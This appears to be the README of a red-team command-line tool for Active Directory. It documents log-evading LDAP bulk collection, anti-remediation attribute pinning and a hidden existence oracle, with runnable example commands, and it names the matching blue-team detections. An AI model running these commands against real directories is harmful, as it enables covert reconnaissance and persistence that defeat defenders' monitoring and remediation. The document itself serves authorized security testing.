# ldapctl — red-team LDAP extended-control CLI

Operationalizes three validated Active Directory LDAP-extended-control techniques:

| Subcommand | What it does | Finding |
|-----------|--------------|---------|
| `collect` | invisible bulk collection of objects + group memberships via OBJECT_SECURITY DirSync | OBJECT_SECURITY DirSync |
| `pin` | make a value survive remediation by inflating its replication version (FORCE_UPDATE) | FORCE_UPDATE conflict-win |
| `recon` | test whether an object exists — invisibly to LDAP query logging | EXPECTED_ENTRY_COUNT oracle |

> ## ⚠️ Authorization
> For **authorized security testing and research only** — your own lab, or an engagement you have
> written permission for. Acts only on the target/objects you point it at. Use it lawfully.

## Install

```bash
pip install .            # installs the `ldapctl` command
# or, without installing:  python -m ldapctl <subcommand> ...
```
Requires Python 3.8+, `ldap3`, and `pycryptodome` (for NTLM). `pip install -r requirements.txt`.

## How to run

Three equivalent ways to invoke a subcommand:

```bash
ldapctl <subcommand> ...              # after `pip install .`
python -m ldapctl <subcommand> ...    # from this red/ folder, no install
```

**Windows convenience wrapper** — `ldapctl.ps1` sets `PYTHONUTF8=1` (so em-dashes render) and uses
the project's scanner venv Python if present (else system `python`), so you only type the args:

```powershell
cd red
$env:LDAPCTL_PASSWORD = '...'         # keep the password off the command line
.\ldapctl.ps1 recon   --dc dc01.cloud.lab --user 'CLOUD\svc-research' --dn 'CN=Administrator,CN=Users,DC=cloud,DC=lab'
.\ldapctl.ps1 collect --dc dc01.cloud.lab --user 'CLOUD\svc-research' --filter '(objectClass=user)' --output users.json
```

Start with `recon` (read-only, one line) to confirm the bind works before anything else.
Collection output (`*.json`, `*.cookie`) is git-ignored — it can contain directory data, so do not
commit it.

## Global options (every subcommand)

| Flag | Meaning | Default |
|------|---------|---------|
| `--dc` | DC hostname/IP | *(required)* |
| `--user` | bind user, `DOMAIN\user` | *(required)* |
| `--password` | bind password | `$LDAPCTL_PASSWORD` |
| `--auth` | `ntlm` or `simple` | `ntlm` |
| `--port` | LDAP port | `389` |

Set the password out of shell history: `export LDAPCTL_PASSWORD='...'`.

---

## `collect` — invisible DirSync collection

Bulk-reads objects and their attributes (including group `member` lists) via **OBJECT_SECURITY
DirSync**, paging with the DirSync cookie. Generates **no Event 1644 and no Event 4662** — it uses
the replication path with no Get-Changes right. Scopes to what your account can already read; it
does **not** bypass confidential attributes, and it does **not** return security descriptors (ACL
harvest needs ordinary searches, which log). Save the cookie to re-run incrementally (changes only).

**Account / privilege:** any authenticated **Domain User**. No special rights, no config change.

| Flag | Meaning | Default |
|------|---------|---------|
| `--base` | search base DN | domain root |
| `--filter` | LDAP filter | `(objectClass=*)` |
| `--attributes` | comma-separated attributes | a useful default set |
| `--output` | output JSON path | `collected.json` |
| `--cookie-file` | read+write DirSync cookie for incremental runs | *(none)* |

```bash
# collect all users into JSON, as a plain domain user
ldapctl collect --dc dc01.cloud.lab --user 'CLOUD\svc-research' \
    --filter '(objectClass=user)' --output users.json

# collect groups (with member lists) and keep a cookie for later delta runs
ldapctl collect --dc dc01.cloud.lab --user 'CLOUD\svc-research' \
    --filter '(objectClass=group)' --output groups.json --cookie-file groups.cookie
```
Output: `{ "collected_utc", "count", "objects": [ { "dn", "attributes": { ... } } ] }`.
**Footprint:** none in host logs (0× 1644, 0× 4662). *Detected only by a SACL audit-ACE ("canary")
on the target objects — see the blue tool's `Deploy-SaclCanary`.*

---

## `pin` — FORCE_UPDATE anti-remediation

Sets `--value` on an attribute, then inflates that attribute's **per-attribute replication version**
so it beats a defender's later correction on another DC (AD resolves conflicts by version before
timestamp). Refuses **linked** attributes (`member`, `memberOf`, …) — they use LVR and are
unaffected. Retries past the intermittent control rejection.

**Account / privilege:** an account with **WriteProperty on the target attribute** — no Domain
Admin, no replication rights. Delegate it with, e.g.:
```
dsacls "\\dc01.cloud.lab\CN=svc-x,OU=...,DC=cloud,DC=lab" /G "CLOUD\attacker:WP;description"
```

| Flag | Meaning | Default |
|------|---------|---------|
| `--target-dn` | object DN to write | *(required)* |
| `--attribute` | attribute to pin | *(required)* |
| `--value` | value to set and keep | *(required)* |
| `--count` | version-inflating forces to land | `5` |
| `--dry-run` | bind + linked-attr check only, no write | off |

```bash
ldapctl pin --dc dc01.cloud.lab --user 'CLOUD\attacker' \
    --target-dn 'CN=svc-x,OU=Svc,DC=cloud,DC=lab' \
    --attribute description --value 'OWNED' --count 5
```
**Footprint:** writes the attribute and bumps its replication version. **Not stealthy** — detectable
via replication metadata (version rises with no value change) — see the blue tool's
`Invoke-ReplMetadataHunt`. Not privilege escalation (bounded by your existing write access).

---

## `recon` — existence oracle (invisible to Event 1644)

Uses **EXPECTED_ENTRY_COUNT** (base scope) to test whether a specific DN exists, **without reading
its attributes** and **without appearing in Event 1644** (the control is not recorded there).

**Account / privilege:** any authenticated **Domain User**.

| Flag | Meaning |
|------|---------|
| `--dn` | object DN to test for existence |

```bash
ldapctl recon --dc dc01.cloud.lab --user 'CLOUD\svc-research' \
    --dn 'CN=Administrator,CN=Users,DC=cloud,DC=lab'      # -> exists: true
```
Note: AD evaluates EXPECTED_ENTRY_COUNT as 0 under subtree scope, so this is a base-DN existence
oracle only, not a subtree counter.
